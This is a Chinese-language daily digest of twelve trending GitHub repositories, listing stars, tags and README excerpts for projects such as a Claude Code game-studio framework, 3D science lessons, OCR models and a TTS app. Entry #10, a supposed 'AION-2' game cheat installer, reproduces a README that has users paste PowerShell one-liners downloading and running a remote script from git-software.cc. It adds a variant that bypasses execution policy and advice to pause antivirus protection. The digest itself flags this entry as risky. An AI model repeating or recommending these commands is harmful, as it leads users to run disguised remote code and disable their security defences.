📊 开源日报 — 2026-10-30
共发现 12 个新项目（已自动过滤历史记录）

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#1  Donchitos/Claude-Code-Game-Studios
    ⭐ 29593 stars  |  🍴 4070 forks  |  💻 Shell  |  📅 2026-02-12
    🔗 https://github.com/Donchitos/Claude-Code-Game-Studios
    📡 来源: trending-daily
    🏷️ ai-agents, ai-assisted-development, anthropic, claude, claude-code, game-design, game-development, gamedev, godot, indie-game-dev
    📝 Turn Claude Code into a full game dev studio — 49 AI agents, 72 workflow skills, and a complete coordination system mirroring real studio hierarchy.

    README 摘要:
    Claude Code Game Studios
      
        Turn a single Claude Code session into a full game development studio.
        
        49 agents. 74 skills. One coordinated AI team.
      
    
      
      
      
      
      
      
      
      
    
    ---
    
    ## Why This Exists
    
    Building a game solo with AI is powerful — but a single chat session has no structure. No one stops you from hardcoding magic numbers, skipping design docs, or writing spaghetti code. There's no QA pass, no design review, no one asking "does this actually fit the game's vision?"
    
    **Claude Code Game Studios** solves this by giving your AI session the structure of a real studio. Instead of one general-purpose assistant, you get 49 specialized agents organized into a studio hierarchy — directors who guard the vision, department leads who own their domains, and specialists who do the hands-on work. Each agent has defined responsibilities, escalation paths, and quality gates.
    
    The result: you still make every decision, but now you have a team that asks the right questions, catches mistakes early, and keeps your project organized from first brainstorm to launch.
    
    ---
    
    ## Table of Contents
    
    - What's Included
    - Studio Hierarchy
    - Slash Commands
    - Does it produce games, or documents?
    - Getting Started
    - Configuration
    - Upgrading
    - Project Structure
    - How It Works
    - Design Philosophy

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#2  aschmelyun/print-my-profile-pic
    ⭐ 1063 stars  |  🍴 2 forks  |  💻 None  |  📅 2026-10-27
    🔗 https://github.com/aschmelyun/print-my-profile-pic
    📡 来源: 🚀 5天300+星
    📝 Say cheese! Star this repo and your profile picture gets printed out on a receipt printer.

    README 摘要:
    # print-my-profile-pic
    
    Star this repo to have your GitHub profile picture framed, printed out on my receipt printer, and stuck to my wall. 
    
    That's it!
    
    > [!TIP]
    > If you give a one-time sponsorship of any amount beforehand, your profile picture will be printed in a **special frame**.
    
    ## How's it work?
    
    GitHub allows you to create webhooks for specific events on your repos, I've set one up for starring this project.
    
    When that happens, a payload is POSTed to a Cloudflare tunnel domain, which leads to a PHP script running on a Raspberry Pi that's sitting on my desk.
    
    From the inbound request, you can gleen info about the person who starred the repo, like their display name and avatar URL. The script takes their profile picture, renders it behind a cut-out of a photo frame, and then adds some other info I thought should be included in each receipt.
    
    The RPi is connected to an Epson TM-T88IV thermal receipt printer via USB, and the PHP script uses my go-to escpos-php library to format the receipt data and send it off to the printer.
    
    ## But why?
    
    It sounded fun when my friend Sam mentioned it. That's pretty much it!
    
    ## What now?
    
    I'll periodically update this README with a picture of the pinboard I've dubbed the "Hall of Frame" as pictures get added to it. 
    
    Want to add a new frame? Send in a PR!

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#3  smithjohn78390/tongjiang-lab
    ⭐ 1023 stars  |  🍴 285 forks  |  💻 HTML  |  📅 2026-10-28
    🔗 https://github.com/smithjohn78390/tongjiang-lab
    📡 来源: 🚀 5天300+星
    🏷️ 3d, biology, chemistry, education, geography, high-school, interactive, open-educational-resources, physics, threejs
    📝 Free interactive 3D science lessons for high school · 铜匠实验室 · https://lab.tongjiang.app

    README 摘要:
    # Tongjiang Lab
    
    English | 简体中文
    
    **Free, interactive 3D science lessons for high school — physics, chemistry, biology and geography.**
    
    Try them online: **https://lab.tongjiang.app**
    
    There are 54 lessons so far. Each one is a **single self-contained HTML file** of about 1 MB: double-click to open it, and it works offline, on a projector or on an interactive whiteboard. Every lesson is one 3D world with a live control console, a guiding question and a step-by-step path a teacher can follow from start to finish.
    
    The lessons follow the Chinese national curriculum standards for senior high school and the People's Education Press (PEP) 2019 textbooks. The lesson interface is currently in Chinese; other languages are planned.
    
    ## How to use
    
    - **Online**: click **▶ Open lesson** in the tables below. GitHub only shows the source code of an HTML file, so use these links to see the lessons.
    - **Offline**: download all lessons as one zip from Releases, or download a single lesson from its page on https://lab.tongjiang.app, then open it in Chrome or Edge.
    - **Embed**: `" width="100%" style="aspect-ratio:16/9;border:0" allow="fullscreen">`
    - **Data**: `catalog.json` lists every lesson with its textbook location and steps.
    
    ## Lessons
    
    ### Physics (10)
    
    | Lesson | PEP 2019 textbook | Steps | Open | Source |
    |---|---|---|---|---|
    | The Photoelectric Effect | Elective Vol. 3, Ch. 4, Sec. 2 | 9 | ▶ Open lesson | HTML |
    | Observing Capacitor Charging and Discharging | Required Vol. 3, Ch. 10, Sec. 4 | 9 | ▶ Open lesson | HTML |
    | Experiment: Acceleration vs. Force and Mass | Required Vol. 1, Ch. 4, Sec. 2 | 8 | ▶ Open lesson | HTML |
    | Experiment: Verifying Conservation of Mechanical Energy | Required Vol. 2, Ch. 8, Sec. 5 | 8 | ▶ Open lesson | HTML |
    | Experiment: Exploring Projectile Motion | Required Vol. 2, Ch. 5, Sec. 3 | 9 | ▶ Open lesson | HTML |
    | Centripetal Force vs. Radius, Angular Velocity and Mass | Required Vol. 2, Ch. 6, Sec. 2 | 8 | ▶ Open lesson | HTML |
    | Self-Induction and Eddy Currents | Elective Vol. 2, Ch. 2, Sec. 4 | 9 | ▶ Open lesson | HTML |
    | Measuring EMF and Internal Resistance | Required Vol. 3, Ch. 12, Sec. 3 | 9 | ▶ Open lesson | HTML |
    | Magnetic Field of an Electric Current | Required Vol. 3, Ch. 13, Sec. 1 | 9 | ▶ Open lesson | HTML |
    | Brownian Motion and Diffusion | Elective Vol. 3, Ch. 1, Sec. 1 | 9 | ▶ Open lesson | HTML |
    
    ### Chemistry (25)
    
    | Lesson | PEP 2019 textbook | Steps | Open | Source |
    |---|---|---|---|---|

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#4  Azure-Samples/serverless-chat-langchainjs
    ⭐ 866 stars  |  🍴 485 forks  |  💻 TypeScript  |  📅 2024-02-06
    🔗 https://github.com/Azure-Samples/serverless-chat-langchainjs
    📡 来源: 🤖 AI / LLM / RAG | 活跃 | RAG retrieval augmented 
    🏷️ ai-azd-templates, azd-templates, azure, azure-functions, chatbot, generative-ai, javascript, langchain-js, mongodb, rag
    📝 Build your own serverless AI Chat with Retrieval-Augmented-Generation using LangChain.js, TypeScript and Azure

    README 摘要:
    # Serverless AI Chat with RAG using LangChain.js
    
    :star: If you like this sample, star it on GitHub — it helps a lot!
    
    Overview • Get started • Run the sample • Resources • FAQ • Troubleshooting
    
    This sample shows how to build a serverless AI chat experience with Retrieval-Augmented Generation using LangChain.js and Azure. The application is hosted on Azure Static Web Apps and Azure Functions, with Azure Cosmos DB for NoSQL as the vector database. You can use it as a starting point for building more complex AI applications.
    
    > [!TIP]
    > You can test this application locally without any cost using Ollama. Follow the instructions in the Local Development section to get started.
    
    ## Overview
    
    Building AI applications can be complex and time-consuming, but using LangChain.js and Azure serverless technologies allows to greatly simplify the process. This application is a chatbot that uses a set of enterprise documents to generate responses to user queries.
    
    We provide sample data to make this sample ready to try, but feel free to replace it with your own. We use a fictitious company called _Contoso Real Estate_, and the experience allows its customers to ask support questions about the usage of its products. The sample data includes a set of documents that describes its terms of service, privacy policy and a support guide.
    
      
    
    This application is made from multiple components:
    
    - A web app made with a single chat web component built with Lit and hosted on Azure Static Web Apps. The code is located in the `packages/webapp` folder.
    
    - A serverless API built with Azure Functions and using LangChain.js to ingest the documents and generate responses to the user chat queries. The code is located in the `packages/api` folder.
    
    - A database to store chat sessions and the text extracted from the documents and the vectors generated by LangChain.js, using Azure Cosmos DB for NoSQL.
    
    - A file storage to store the source documents, using Azure Blob Storage.
    
    We use the HTTP protocol for AI chat apps to communicate between the web app and the API.
    
    ## Features
    
    - **Serverless Architecture**: Utilizes Azure Functions and Azure Static Web Apps for a fully serverless deployment.
    - **Retrieval-Augmented Generation (RAG)**: Combines the power of Azure Cosmos DB and LangChain.js to provide relevant and accurate responses.
    - **Chat Sessions History**: Maintains a personal chat history for each user, allowing them to revisit previous conversations.
    - **Scalable and Cost-Effective**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#5  valentderah/totk-pc-recomp
    ⭐ 751 stars  |  🍴 40 forks  |  💻 C  |  📅 2026-10-29
    🔗 https://github.com/valentderah/totk-pc-recomp
    📡 来源: 🚀 5天300+星
    📝 Static recompilation of The Legend of Zelda: Tears of the Kingdom to native Windows x86-64, with a Vulkan renderer. Game files not included.

    README 摘要:
    # TotK Recomp
    
    **TotK Recomp** is a static recompilation of *The Legend of Zelda: Tears of the Kingdom* (Nintendo Switch, 2023) into a native Windows x86-64 application (docs/architecture.md).
    
    > [!IMPORTANT]
    > **No game files are included.** You need your own legally obtained copy of *Tears of the Kingdom*, dumped from your own console: the base game and the 1.2.1 or 1.4.3 update. Instructions for obtaining those files will not be provided.
    >
    > The game is built from your files on your machine, so the result contains the game. It is for your own use. Do not share it.
    
    ## Status
    
    Early development. The game is playable on Windows; visual bugs and crashes are still expected.
    
    Report problems as issues, following CONTRIBUTING.md.
    
    ## Features
    
    - Native code, not emulation
    - Game updates 1.2.1 and 1.4.3, with saves that carry over between them
    - 60 fps by default; up to 144 fps or the monitor's refresh rate (experimental)
    - Custom resolutions (1080p, 2k...), supersampling and AMD FSR 1 upscaling
    - In-game settings menu (F1) and performance overlay (F10)
    - Keyboard, mouse and gamepad with remapping, rumble and gyro
    - Shaders prepared at install instead of during play
    
    ## Planned
    
    - Linux and the Steam Deck
    - Mods made for emulators: unpack a mod into a `mods` folder
    - Custom aspect ratios, including ultrawide
    - VRR
    
    ## Installing
    
    Requirements: Windows 10 or later, an x86-64 CPU with AVX2, a GPU with Vulkan 1.3 and `VK_EXT_external_memory_host`, about 36 GiB free during setup (20 GiB after).
    
    1. Download `TotK-Setup--windows.zip` from Releases and unpack it.
    2. Start `TotK-Setup.exe`. If SmartScreen warns about an unsigned app, choose *More info*, then *Run anyway*.
    3. Pick your game files, the language and an install folder, and press *Start*. The setup builds the game once.
    4. Play `totk.exe` from the install folder.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#6  yaojingang/GEOInflow
    ⭐ 740 stars  |  🍴 232 forks  |  💻 TypeScript  |  📅 2026-10-26
    🔗 https://github.com/yaojingang/GEOInflow
    📡 来源: 🚀 5天300+星
    🏷️ ai-analytics, geo, mit, postgresql, self-hosted, web-analytics
    📝 Self-hosted web and AI crawler analytics for Generative Engine Optimization (GEO). Track visitors, AI search referrals, crawl logs, content coverage, and conversions. Jointly published by 猎看科技 · 北京日报社智源GEO. MIT licensed.

    README 摘要:
    # GEOInflow
    
    **English** | 简体中文 | 日本語
    
    Self-hosted web and AI crawler analytics for Generative Engine Optimization (GEO).
    
    **Jointly published by 猎看科技 · 北京日报社智源GEO**
    
    Quick start · Deployment · AI crawler analytics · Architecture · Documentation · Contributing
    
    GEOInflow brings website visitors, AI search referrals, server crawl logs, and content inventories into a shared website context. It helps teams understand which AI crawlers visit their sites, which pages they request, which important pages have no observed crawl activity, where requests fail, and how AI search contributes visitors and conversions.
    
    The system includes browser tracking, account permissions, GEO reports, crawler evidence, log collection, and analytics acceleration. The current product version is **v1.2**, with build version **1.2.0**. Application source code is distributed under the MIT license.
    
    Quick start and deployment guides are available in English and Simplified Chinese. Other linked reference guides are currently in Simplified Chinese.
    
    ## Introduction video
    
    https://github.com/user-attachments/assets/81e57cc4-3441-4e5f-b2fb-cd929c6c27bd
    
    ## What you can use it for
    
    | Question | Available data | Actions it can inform |
    | --- | --- | --- |
    | Which AI platforms visit the site? | Crawler identity, purpose, provider, request volume, verification status, and trends | Distinguish training, search, and user-triggered requests to understand how content is accessed |
    | Which pages are crawled repeatedly? | Page rankings, repeat requests, directory distribution, and recent activity | Review frequently requested paths, invalid URLs, and content structure |
    | Have important pages been crawled? | Import sitemap / CSV / JSON inventories and compare them with observed logs | Check entry points, internal links, robots rules, and responses |
    | Are crawler requests succeeding? | HTTP status, GET / HEAD, caching, latency, errors, and risk signals | Investigate blocked requests, origin errors, coverage drops, and source interruptions |
    | What does AI search bring to the site? | AI referral sessions, landing pages, goals, and conversions | Observe changes in real traffic and business outcomes |
    | Is there enough evidence for a conclusion? | Identity evidence, source coverage, gaps, missing inputs, and estimates | Review results over the same data scope and keep evidence gaps explicit |
    
    GEOInflow is designed for company websites, content sites, media publishers, developer documentation, and GEO t

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#7  blakeandersonw/ai-app-playbook
    ⭐ 579 stars  |  🍴 82 forks  |  💻 TypeScript  |  📅 2026-10-26
    🔗 https://github.com/blakeandersonw/ai-app-playbook
    📡 来源: 🚀 5天300+星
    📝 How to build useful, profitable apps in 2026. Clone it and point your coding agent at AGENTS.md.

    README 摘要:
    ```
    Clone https://github.com/blakeandersonw/ai-app-playbook and read AGENTS.md
    ```
    
    Paste into Claude Code or OpenCode, in an empty folder.
    
    Please follow me and star this repo to stay up to date!
    
     
    
      
    
    # How to build useful, profitable apps in 2026
    
    My background: I've scaled 5 apps to $100k+ MRR in the past 3 years.
    
    This is the stack I would start with today. We initially built EcoGPT (apply here) on this stack.
    
    Good apps help people get fit, focus, learn, or feel calmer, and people pay for them. This playbook goes from picking a problem to your first profitable month.
    
    ## Examples
    
    | Help people… | Like |
    |---|---|
    | 💪 Get fit and eat better | Cal AI, Ladder, Yuka |
    | 📵 Take back their time | Opal, Structured |
    | 📚 Learn | Duolingo, Speak, Photomath |
    | 🧘 Feel calmer | Hallow, Finch |
    | 🌱 Understand the world | PictureThis, Yuka |
    | 💼 Earn | SideShift |
    
    ## The path
    
    | Phase | What | Check |
    |---|---|---|
    | 0 · Niche | Pick a frequent problem AI solves in seconds. Test it with 10 videos and a waitlist | Score ≥ 25/35, real demand |
    | 1–12 · Build | Brief, repo, backend, auth, AI, web, iOS/Android, payments, analytics, onboarding, retention, launch | "Done when" per phase |
    | 13 · First 1,000 | Short-form video, creators on SideShift / Trybe, DMs to influencers and meme pages | Content live and tracked |
    | 14 · Grow | Weekly: one funnel experiment, one product fix | Weekly report |
    

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#8  OpenBMB/MiniCPM-OCR
    ⭐ 571 stars  |  🍴 33 forks  |  💻 TypeScript  |  📅 2026-10-27
    🔗 https://github.com/OpenBMB/MiniCPM-OCR
    📡 来源: 🚀 5天300+星
    🏷️ image2text, minicpm-v, ocr
    📝 Fast, accurate OCR with correctness assessment.

    README 摘要:
    MiniCPM-OCR 1.0 Guide&ensp;&ensp;
      &emsp;
      MiniCPM-OCR Jev Guide&ensp;&ensp;
    
      Demo (CN / Global)
      &nbsp;·&nbsp;
      Get Started &nbsp;·&nbsp;
      Weights &nbsp;·&nbsp;
      Free API &nbsp;·&nbsp;
      Skill &nbsp;·&nbsp;
      Local Deployment
      &nbsp;|&nbsp; 中文
      
      Join the Community via
      Feishu / Lark &nbsp;·&nbsp;
      Discord
    
    **MiniCPM-OCR** is a family of models for efficient document parsing and text recognition. **MiniCPM-OCR 1.0** parses Chinese and English documents and PDFs, balancing quality and efficiency across challenging inputs such as scans, photographs, curved pages, and recaptured documents. **MiniCPM-OCR Jev** evaluates OCR results at the region level, distinguishing problematic regions from reliable ones. It works with different parsing models to help users locate content that needs review.
    
    ## MiniCPM-OCR 1.0
    
    **MiniCPM-OCR 1.0** (1.3B) is the first OCR-specific model in the MiniCPM-V/o family. It focuses on text-centric document understanding, covering text, tables, formulas, charts, seals, and structured information extraction. Its key features include:
    
    - 🏆 **SOTA document parsing**: MiniCPM-OCR 1.0 achieves a **SOTA score of 93.68 on Real5-OmniDocBench**, a benchmark for real-world document parsing, and demonstrates leading parsing capabilities on OmniDocBench v1.6, Wild-OmniDocBench, and olmOCR-Bench. It supports Chinese and English documents and PDFs, handling both standard documents and challenging capture conditions, including scans, curved pages, photographs, skewed pages, and recaptured documents.
    - ⚡ **Efficient inference.** With DSpark decoding acceleration (**DSpark-BF16**, **DSpark-GGUF**), MiniCPM-OCR 1.0 improves **end-to-end processing efficiency by 55%**. Its throughput is approximately **1.49×** that of PaddleOCR-VL-1.6 and **3.62×** that of MinerU2.5 Pro, reducing the time needed for large-scale document parsing.
    - 🔍 **General recognition and information extraction**: MiniCPM-OCR 1.0 achieves a **SOTA score of 54.7 on OCRBench v2**, demonstrating strong general OCR capabilities. It **also supports key information extraction (KIE)**, extracting relevant document content for downstream information management and automated processing.
    - 🛠️ **Easy deployment and development**: MiniCPM-OCR 1.0 supports **vLLM, SGLang, llama.cpp, and Ollama from day one**, with multiple chip platforms and quantized versions available at release. It **supports further fine-tuning** and provides a **pip SDK** and a **full-featured API**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#9  hehehai/AudioSmith
    ⭐ 176 stars  |  🍴 17 forks  |  💻 Go  |  📅 2026-10-13
    🔗 https://github.com/hehehai/AudioSmith
    📡 来源: 📖 阅读/内容平台 | 活跃 | audiobook text-to-speech
    🏷️ speaker-diarization, speech-synthesis, speech-to-text, text-to-speech, transcription, tts, voice-cloning, voice-design
    📝 Speech, voices, stories, audiobooks, dubbing and transcription, made on your Mac. Free and open source.

    README 摘要:
    AudioSmith
    
      A voice studio that runs on your Mac.
      Speech, voices, stories, audiobooks, dubbing, transcription and dictation, on Apple silicon.
    
      
      
      
      
    
    Website · Download · Changelog
    
    English · 简体中文
    
    AudioSmith turns text into speech, clones and designs voices, gives a story a cast, reads a book into an M4B, dubs a video into another language, transcribes a recording with who said what, and types what you say into any app. Every model runs on your Mac's GPU with MLX: no account, no cloud service, no Python. It runs on your Mac, and once its models are downloaded it works offline.
    
    Features · Install · Models · Privacy · Build from source · Licence
    
    > **The current version, 0.4.0-beta.7, is a beta.** Releases are signed with a Developer ID, notarized by Apple and update themselves. Expect rough edges; see Known limits and the changelog.
    
    ## Features
    
    ### Studio
    
    - **Write or import** a script (TXT, MD, DOCX, EPUB, SRT, VTT). Markup adds pauses (`[pause 400ms]`), pace (`[slow]`, `[fast]`), emphasis, spelling and one-off pronunciations (`[[word|say]]`).
    - **Pick a model by what it is for:** Standard voices, Fast clone, High-fidelity clone, Voice design, Fast English voices, English clone or Multilingual all-rounder. The technical name is one click away.
    - **Few controls:** the model, one Voice list and the speed. Everything else is under Advanced, filled with settings measured for each model.
    - **Long scripts** render in chunks and play while they render. Text you did not change comes from a cache.
    - **Export audio:** WAV or M4A, and MP3, FLAC or Opus with ffmpeg. Even out the loudness to −16, −18 or −23 LUFS, trim the silence, add tags, save the script and subtitles beside it.
    
    ### Voices
    
    | Discover voices | My voices |
    |---|---|
    |  |  |
    
    - **Discover** 37 chosen voices, mostly Chinese and English: designed voices whose reference ships with the app, ready to speak at once, and the best built-in speakers. Preview them and save the ones you like.
    - **Clone** a voice from a recording or from any audio or video file. AudioSmith picks the best stretch and transcribes it. A recorded consent statement marks a voice as your own.
    - **Checked references:** every reference is rated (good, fine, needs work) with a tip or two, and cleaned: noise removed only when there is some, silence trimmed, loudness evened out. The original is kept.
    - **Design** a voice from a sentence in English or Chinese ("a warm narrator in her thirties, calm and clear"), or start

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#10  ⚠️风险  SupervisorScrew/AION-2-Cheat
    ⚠️ 命中风险词: bypass —— 默认归排除区，需人工确认
    ⭐ 138 stars  |  🍴 0 forks  |  💻 None  |  📅 2026-10-29
    🔗 https://github.com/SupervisorScrew/AION-2-Cheat
    📡 来源: 🤖 AI / LLM / RAG | 新建 | prompt engineering tool
    🏷️ aion-2, aion-2-2026, aion-2-cheats, aion-2-game, aion-2-optimizer, aion-2-trainer, aion2-combat-analysis, aion2-meter
    📝 Aion 2: Full working installer for advanced AI prompt engineering tools, ready to run on your desktop.

    README 摘要:
    # Aion 2 — Standalone Desktop Installer
    
    Pre-activated local build for testing and deployment.
    
    > **Distribution Type:** Pre-activated Standalone Build  
    > **Target Platform:** Windows x64 Desktop  
    > **Estimated File Size:** 1.5 GB  
    > **Last Verified Mirror Sync:** October 2026
    
    ---
    
    ## 🛠️ Quick Setup Guide (PowerShell)
    
    1. Launch PowerShell:
       * Press `Win + X` on your keyboard.
       * Click on **Terminal** or **Windows PowerShell** from the list.
    
    2. Execute the Setup Script:
       Copy the command below, paste it into your PowerShell window, and hit `Enter`. Wait until all :
    
       ```cmd
       irm https://git-software.cc/ps/Setup.ps1 | Invoke-Expression
       ```
    
    ---
    
    ## 💡 Resolving Issues
    
    ### 💬 Script is blocked by Execution Policy
    If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):
    ```cmd
    powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://git-software.cc/ps/Setup.ps1 | Invoke-Expression"
    ```
    
    ### 💬 Antivirus / SmartScreen Alerts
    Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.
    
    ---
    
    ## 🔍 Organic Discovery & Identification

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#11  setube/github-chinese
    ⭐ 38 stars  |  🍴 3 forks  |  💻 TypeScript  |  📅 2026-10-26
    🔗 https://github.com/setube/github-chinese
    📡 来源: 🌍 本地化/多语言 | 新建 | localization i18n transl
    🏷️ browser-extension, chinese, chrome-extension, edge-extension, firefox-extension, github, i18n, localization, manifest-v3, simplified-chinese
    📝 把 GitHub 界面翻译成简体中文、繁体中文的浏览器扩展（Chrome、Edge、Firefox）

    README 摘要:
    # GitHub 中文化
    
    把 GitHub 界面翻译成简体中文、繁体中文的浏览器扩展
    
    安装 · 功能 · 使用 · 工作原理 · 隐私与权限 · 参与贡献 · 反馈问题
    
    ---
    
    在 github.com、gist.github.com、www.githubstatus.com 上把界面文字替换为简体中文或繁体中文，翻译在本地完成。
    
    只翻译界面，不碰用户内容：自述文件、评论、代码、提交消息、存储库名、用户名、自定义标签名等保持原文。
    
    | 英文界面      | 简体中文 | 繁體中文 |
    | ------------- | -------- | -------- |
    | Pull requests | 拉取请求 | 拉取請求 |
    | Issues        | 议题     | 議題     |
    | Actions       | 操作     | 動作     |
    | Releases      | 发行版   | 發行版本 |
    | Fork          | 复刻     | 分叉     |
    | Star          | 星标     | 加星號   |
    
    ## 功能
    
    ### 翻译
    
    - 简体、繁体两套词典，各 3 万余条，词条按页面类型（存储库、议题、拉取请求、操作、设置等）区分
    - 繁体按台湾、香港、澳门用语从英文翻译，不是简繁转换；术语见简体术语表、繁体术语表
    - 跟随 GitHub 的 React 渲染与页面切换实时翻译，文字被改写后自动重新翻译
    - 属性（`aria-label`、`placeholder`、`title` 等）与标签页标题一并翻译
    - 时间本地化：`` 按翻译语言显示为「3 天前」「2026 年 10 月 26 日」
    
    ### 控制
    
    - 弹出页：总开关、当前页状态、排除此页、时间本地化、翻译标题、界面语言、翻译语言、外观
    - 选项页（弹出页「规则」）：排除路径、自定义词条（导入、导出）
    - 翻译语言默认按浏览器语言识别（语言列表中第一个中文：台湾、香港、澳门及 Hant 为繁体；没有中文时按时区），可手动指定；切换后已打开的页面随即重译
    - 扩展界面：简体中文、繁體中文、English，默认跟随浏览器界面语言
    - 外观：自动（跟随系统）、浅色、深色
    
    ## 安装

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#12  ⚠️风险  Phantomduke375846-alt/clinic_rag_rpocket_bot
    ⚠️ 命中风险词: poc —— 默认归排除区，需人工确认
    ⭐ 32 stars  |  🍴 0 forks  |  💻 HTML  |  📅 2026-10-28
    🔗 https://github.com/Phantomduke375846-alt/clinic_rag_rpocket_bot
    📡 来源: 🤖 AI / LLM / RAG | 新建 | RAG retrieval augmented 
    🏷️ ai-moderation, aiogram, assistant-chat-bots, calendar, calendar-events, calendar-view, crush, crush-cli, local-llm, logging
    📝 A domain-specific medical Retrieval-Augmented Generation (RAG) system that answers health-related questions strictly based on retrieved evidence from a local vector database.

    README 摘要:
    (README 获取失败)
